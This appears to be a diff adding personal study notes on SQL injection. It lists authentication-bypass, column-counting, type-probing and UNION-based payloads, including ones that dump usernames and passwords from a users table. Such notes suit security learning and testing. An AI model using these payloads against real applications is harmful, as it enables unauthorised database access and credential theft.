@@ -1,0 +1,34 @@
+* Test sql injection:
+' OR 1=1--
+
+========================================================================================================================================
+
+* Inject malicious query: 
+  1- Check how many parameter in the original query: ' order by 1--, ' order by 2--, ...
+  2- Re-check: ' UNION select null, null--
+  3- try to find usefull data:
+     *\  select @@VERSION (MySQL), select version(PostgreSQL)
+     *\  select * from information_schema.tables, select * from information_schema.columns where table_name = 'TABLE_NAME' -> MySQL and PostgreSQL 
+     *\ Database version:
+	  Database type	      Query
+	  Microsoft, MySQL    SELECT @@version
+	  Oracle	      SELECT * FROM v$version
+	  PostgreSQL	      SELECT version()
+
+========================================================================================================================================
+
+* method to check the type of every column:
+   ' UNION SELECT 'a',NULL,NULL,NULL--
+   ' UNION SELECT NULL,'a',NULL,NULL--
+   ' UNION SELECT NULL,NULL,'a',NULL--
+   ' UNION SELECT NULL,NULL,NULL,'a'--
+   => if it generate an error that means its type isnt string (this can make as pull data such as table_name...)
+
+* find users data in MySQL: ' UNION SELECT username, password from users
+* when sql query pass only 1 parameter: ' UNION SELECT username || '-' || password FROM users
+
+CHECK FOR QUERY COLUMN THAT RETURNS STRING: '+UNION+SELECT+NULL,'abc'--
+
+NOTE: comments typographie -> #, --, /**/ 
+
+
